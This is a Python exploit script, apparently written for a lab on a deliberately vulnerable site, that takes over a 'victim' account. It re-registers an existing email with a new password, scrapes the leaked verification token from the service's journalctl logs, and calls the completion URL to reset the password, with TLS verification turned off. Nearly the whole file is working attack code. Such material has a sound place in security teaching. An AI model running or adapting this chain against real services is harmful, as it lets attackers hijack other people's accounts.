import re
import subprocess
import requests
import time



# initializations for victims email and "new" password 
site = "https://bcbm.badlycoded.net"
email = "student3@localhost"
password = "haha"

# activate the registration process of bcbm sync, but we know that this email already has an account, so we are asking for a new password besically 
print("requesting to reset password")

url = f"{site}/reg/{email}/{password}"
# request website for new passowrd    
try:
    response = requests.get(
    url,
    verify=False,
    proxies={"http": None, "https": None}
)

#    response = requests.get(url, verify=False)
    print(f"response: {response.status_code}")
except Exception as e:
    print("error occured",e)
#wait for logs to store information
time.sleep(4)
# if the response status code is valid we cna continue 
print("retrieving token from logs")
result = subprocess.run(
                 ["journalctl","-u","bcbms", "--no-pager", "--since", "2 minutes ago"],
            capture_output=True, text=True)
#print result to see if we are accessing        
#print(result.stdout)
#looking in journals for token
for line in result.stdout.splitlines():
    #looking for "Sending token"
    match = re.search(r"Sending token ([\w\-+=/]+) to " + re.escape(email), line)
#saving token if found 
    if match:
        token = match.group(1)
        print(f"found token: {token}")


print(f"registration token: {token}")
url = f"{site}/complete/{email}/{token}"
#request complete email verification
response = requests.get(
    url,
    verify=False,
    proxies={"http": None, "https": None}
)

# making sure request has been succesfully made
print(f"response status code: {response.status_code}")
if "BCBM" in response.text:
    print(f"password has been reset to: {password}")
else:
    print("didnt work ")

